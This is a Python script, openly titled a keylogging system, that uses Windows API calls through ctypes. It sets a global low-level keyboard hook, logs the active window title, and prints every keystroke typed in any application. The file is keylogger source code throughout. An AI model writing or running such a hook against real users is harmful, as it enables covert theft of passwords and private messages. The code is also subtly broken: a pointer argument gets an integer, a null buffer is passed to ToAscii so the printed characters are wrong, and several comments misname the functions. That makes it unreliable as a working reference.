#!/usr/bin/env python3
'''
Date : 1402/01/30
Author : AmirhosseinKhanshabani - @AmirZoyber
 
Keylogging System - Keylogging System in Python


'''

from ctypes import *
from ctypes import wintypes

user32 = windll.user32

LRESULT = c_long
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
WM_SYSKEYDOWN = 0x0104
WM_SYSKEYUP = 0x0105
WM_RETURN = 0x0D
WM_SHIFT = 0x10

# Define the getForegroundWindow function which is used to get the handle of the foreground window
getWindowTextLenghthA = user32.GetWindowTextLengthA
getWindowTextLenghthA.argtypes = [wintypes.HANDLE]
getWindowTextLenghthA.restype = wintypes.INT

# Define the getWindowTextA function which is used to get the text of the window
getWindowTextA = user32.GetWindowTextA
getWindowTextA.argtypes = [wintypes.HANDLE, wintypes.LPSTR, wintypes.INT]
getWindowTextA.restype = wintypes.INT

# Define the getForegroundWindow function which is used to get the handle of the foreground window
getKeyState = user32.GetKeyState
getKeyState.argtypes = [wintypes.INT]
getKeyState.restype = wintypes.SHORT

# Define the getForegroundWindow function which is used to get the handle of the foreground window
keyboaedState = wintypes.BYTE * 256
getKeyboardState = user32.GetKeyboardState
getKeyboardState.argtypes = [POINTER(keyboaedState)]
getKeyboardState.restype = wintypes.BOOL

# to ascii function which is used to convert the virtual key code to ascii
toAscii = user32.ToAscii
toAscii.argtypes = [wintypes.UINT, wintypes.UINT, POINTER(keyboaedState), POINTER(wintypes.DWORD), wintypes.UINT]
toAscii.restype = wintypes.INT

# callNextHookEx function which is used to call the next hook in the hook chain 
callNextHookEx = user32.CallNextHookEx
callNextHookEx.argtypes = [wintypes.HHOOK, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM]
callNextHookEx.restype = wintypes.LRESULT

# hook procedure which is used to handle the hook events 
HOOKPROC = CFUNCTYPE(wintypes.LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
setWindowsHookExA = user32.SetWindowsHookExA
setWindowsHookExA.argtypes = [wintypes.INT, wintypes.HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD]
setWindowsHookExA.restype = wintypes.HHOOK

# get message function which is used to get the message from the message queue
getMessageA = user32.GetMessageA
getMessageA.argtypes = [POINTER(wintypes.MSG), wintypes.HWND, wintypes.UINT, wintypes.UINT]
getMessageA.restype = wintypes.BOOL

class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", wintypes.DWORD)
    ]
def get_foreground_process():
    # Get the handle of the foreground window
    hwnd = user32.GetForegroundWindow()
    # Get the length of the text of the window
    length = getWindowTextLenghthA(hwnd)
    # Create a buffer to store the text of the window
    buffer = create_string_buffer(length + 1)
    # Get the text of the window
    getWindowTextA(hwnd, buffer, length + 1)
    # Return the text of the window
    return buffer.value.decode()

print(get_foreground_process())
# output : Notepad

# Define the hook function which is used to handle the hook events
def hook_function(nCode, wParam, lParam):
    global last
    if last!= get_foreground_process():
        last = get_foreground_process()
        print(last)
    if wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN:
        keyboard = KBDLLHOOKSTRUCT.from_address(lParam)
        state =  (wintypes.BYTE * 256)()
        getKeyboardState(WM_SHIFT)
        getKeyboardState(byref(state))
        n = toAscii(keyboard.vkCode, keyboard.scanCode, state, 0, 0)
        if n > 0:
            if keyboard.vkCode == WM_RETURN:
                print()
            else:
                print(chr(n), end='')
    return callNextHookEx(hook, nCode, wParam, lParam)

last = None
callback = HOOKPROC(hook_function) # Create a hook procedure type. 

hook = setWindowsHookExA(WH_KEYBOARD_LL, callback,0, 0) # Set the hook and get the handle to the hook procedure. 
getMessageA(byref(wintypes.MSG()), 0, 0, 0) # Get the message from the message queue. 

